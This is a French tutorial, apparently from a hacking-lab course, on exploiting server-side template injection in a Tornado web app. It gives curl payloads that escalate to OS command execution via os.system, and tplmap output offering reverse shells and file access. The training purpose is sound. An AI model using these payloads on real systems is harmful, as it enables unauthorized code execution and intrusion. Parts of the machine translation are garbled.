Exemple d'exploitation SSTI 2
=============================

* * * * *

Supposons que nous soyons chargés de tester une autre application accessible sur Internet. Notre objectif sera d'identifier si l'application est vulnérable à l'injection de modèle côté serveur.

Accédez à la fin de cette section et cliquez sur `Click here to spawn the target system!`, puis utilisez la Pwnbox fournie ou une VM locale pour suivre. Si vous parcourez la cible, vous devriez tomber sur l'application ci-dessous.

![image](https://academy.hackthebox.com/storage/modules/145/img/tornado1.png)

Si vous inspectez le trafic de l'application à l'aide des outils de développement Web de Firefox ( `[Ctrl]`++ ), vous remarquerez que l'entrée de l'utilisateur est soumise dans un paramètre appelé et via une requête POST `[Shift]`à`[I]``email``http://<TARGET IP>:<PORT>/jointheteam`

Soumettons des expressions mathématiques entre accolades dans le champ de saisie, telles que celles mentionnées dans la `SSTI Identification`section, en commençant par `${7*7}`, comme le suggère le diagramme de PortSwigger.

#### cURL - Interagir avec la cible

  cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email ${7*7} has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>

```

Il ne semble pas que l'application ait évalué l'expression soumise. Essayons`{{7*7}}`

#### cURL - Interagir avec la cible

  cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -X POST -d 'email={{7*7}}' http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email 49 has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>

```

L'application a évalué l'expression soumise cette fois. Continuons, comme le suggère le diagramme de PortSwigger, à identifier le moteur de template sous-jacent.

#### cURL - Interagir avec la cible

  cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -X POST -d 'email={{7*'7'}}' http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email 49 has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>

```

L'application a évalué la dernière expression que nous avons soumise. Donc, d'après le diagramme, nous devrions avoir affaire à un moteur de template Twig ou Jinja2, n'est-ce pas ?

Malheureusement, ce n'est pas le cas! Si nous soumettons une charge utile spécifique à Twig ou Jinja2, l'application renvoie `500: Internal Server Error`. Trouvez quelques exemples de ce comportement ci-dessous.

  cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -X POST -d 'email={{_self.env.display("TEST"}}' http://<TARGET IP>:<PORT>/jointheteam

<html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html>

```

  cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam

<html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html>

```

  cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam

<html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html>

```

Les charges utiles que nous avons utilisées (et plus) peuvent être trouvées sur [PayloadsAllTheThings - Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) and [HackTricks- SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

Cela devrait être simple maintenant qu'aucune méthodologie n'est à l'épreuve des balles. Nous pourrions compiler une liste de charges utiles spécifiques au moteur de modèle à partir des ressources susmentionnées et fuzzer l'application jusqu'à ce que nous concluions sur le moteur de modèle utilisé.

Finalement, lors de la soumission de charges utiles spécifiques [à Tornado](https://www.tornadoweb.org/en/stable/guide/templates.html) , nous rencontrerons ce qui suit.

  cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email 0 has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>

```

Il semble que nous l'ayons enfin compris ! Tornado est utilisé sur le backend.

Comme déjà mentionné dans les sections précédentes, `tplmap`peut être utilisé pour automatiser à la fois l'identification du moteur de modèle et le processus d'exploitation.

#### tplmap.py

  tplmap.py

```
dsgsec@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/jointheteam' -d email=blah

    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'email' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: email
  Engine: Tornado
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:

    --os-shell				Run shell on the target
    --os-cmd				Execute shell commands
    --bind-shell PORT			Connect to a shell bind to a target port
    --reverse-shell HOST PORT	Send a shell back to the attacker's port
    --upload LOCAL REMOTE	Upload files to the server
    --download REMOTE LOCAL	Download remote files

```

Maintenant, passez à l'exercice de cette section et complétez l'objectif soit en fabriquant vous-même la charge utile, soit à l'aide d'un obus obtenu à l'aide de `tplmap`.
